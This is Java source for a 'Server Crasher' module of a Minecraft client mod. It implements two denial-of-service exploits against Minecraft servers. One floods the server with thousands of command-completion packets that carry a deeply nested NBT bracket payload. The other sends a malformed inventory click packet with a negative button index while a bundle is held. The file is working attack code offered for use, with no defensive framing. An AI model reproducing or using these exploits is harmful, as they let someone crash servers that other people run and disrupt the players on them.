package ru.sandfoxy.horizen.modules.features.misc;

import net.minecraft.client.MinecraftClient;
import net.minecraft.component.DataComponentTypes;
import net.minecraft.item.ItemStack;
import net.minecraft.item.Items;
import net.minecraft.network.packet.c2s.play.RequestCommandCompletionsC2SPacket;
import net.minecraft.network.packet.c2s.play.PlayerInteractItemC2SPacket;
import net.minecraft.network.packet.c2s.play.ClickSlotC2SPacket;
import net.minecraft.screen.slot.SlotActionType;
import net.minecraft.util.Hand;
import it.unimi.dsi.fastutil.ints.Int2ObjectOpenHashMap;
import ru.sandfoxy.horizen.modules.core.Module;
import ru.sandfoxy.horizen.modules.core.type.ComboBox;

import java.util.Arrays;

public class ServerCrasher extends Module {
    private final MinecraftClient mc = MinecraftClient.getInstance();

    public final ComboBox mode = new ComboBox("Mode", "Paper Completion 1.20.1",
        Arrays.asList("Paper Completion 1.20.1", "BundleExploit-1.21.4"));

    private static final String NBT_EXECUTOR = " @a[nbt={PAYLOAD}]";
    private final String[] knownWorkingMessages = {
        "msg", "minecraft:msg", "tell", "minecraft:tell", "tm", 
        "teammsg", "minecraft:teammsg", "minecraft:w", "minecraft:me"
    };
    private int messageIndex = 0;
    private int tickCounter = 0;

    public ServerCrasher() {
        super("Server Crasher", CATEGORY.MISC, "Advanced server crasher with multiple exploits");

        this.addSetting(mode);
    }

    @Override
    public void onEnable() {
        messageIndex = 0;
        tickCounter = 0;
        
        if (mode.isEquals("BundleExploit-1.21.4")) {
            executeBundleExploit();
        }
    }

    @Override
    public void startTick() {
        if (!isEnabled()) return;
        
        if (mode.isEquals("Paper Completion 1.20.1")) {
            handlePaperCompletionAutoMode();
        }
    }

    private void executeBundleExploit() {
        if (mc.player == null || mc.getNetworkHandler() == null) {
            toggle(false);
            return;
        }

        // Получаем предмет в руке
        ItemStack heldItem = mc.player.getMainHandStack();
        
        // Проверяем, что это bundle
        if (!heldItem.isOf(Items.BUNDLE)) {
            // Если в руке нет bundle'а, отключаем модуль
            toggle(false);
            return;
        }

        // Проверяем, что bundle не пустой
        var bundleContents = heldItem.get(DataComponentTypes.BUNDLE_CONTENTS);
        if (bundleContents == null || bundleContents.isEmpty()) {
            // Bundle пустой, отключаем модуль
            toggle(false);
            return;
        }

        // Получаем слот в инвентаре
        int slotIdx = mc.player.getInventory().selectedSlot + 36; // Hotbar slots start at 36
        int selected = -1337; // Отрицательный индекс для эксплойта

        try {
            // Отправляем пакет ClickSlot с некорректным индексом
            // Это может вызвать ошибку на сервере при обработке bundle
            mc.getNetworkHandler().sendPacket(new ClickSlotC2SPacket(
                0, // Window ID (player inventory)
                0, // Revision
                slotIdx, // Slot
                selected, // Button (отрицательный для эксплойта)
                SlotActionType.PICKUP, // Action type
                ItemStack.EMPTY, // Carried item
                new Int2ObjectOpenHashMap<>() // Changed slots (пустая мапа)
            ));

            // Дополнительно отправляем пакет взаимодействия с предметом
            mc.getNetworkHandler().sendPacket(new PlayerInteractItemC2SPacket(
                Hand.MAIN_HAND, 
                0, // Sequence
                mc.player.getYaw(),
                mc.player.getPitch()
            ));

        } catch (Exception e) {
            // Если возникла ошибка, просто продолжаем
        }

        // Отключаем модуль после выполнения
        toggle(false);
    }

    private void handlePaperCompletionAutoMode() {
        tickCounter++;

        if (tickCounter < 20) return;
        tickCounter = 0;

        if (messageIndex >= knownWorkingMessages.length) {
            messageIndex = 0;
            toggle(false);
            return;
        }
        
        String knownMessage = knownWorkingMessages[messageIndex] + NBT_EXECUTOR;

        int len = 2044 - knownMessage.length();
        String overflow = generateJsonObject(len);
        String partialCommand = knownMessage.replace("{PAYLOAD}", overflow);
        
        int packetCount = 3000;
        for (int i = 0; i < packetCount; i++) {
            sendCompletionPacket(partialCommand);
        }
        
        messageIndex++;
    }

    private void sendCompletionPacket(String command) {
        if (mc.getNetworkHandler() != null) {
            mc.getNetworkHandler().sendPacket(new RequestCommandCompletionsC2SPacket(0, command));
        }
    }

    private String generateJsonObject(int levels) {
        StringBuilder sb = new StringBuilder(4 + levels);
        sb.append("{a:");
        for (int i = 0; i < levels; i++) {
            sb.append('[');
        }
        sb.append('}');
        return sb.toString();
    }

    @Override
    public void onDisable() {
        messageIndex = 0;
        tickCounter = 0;
    }
}
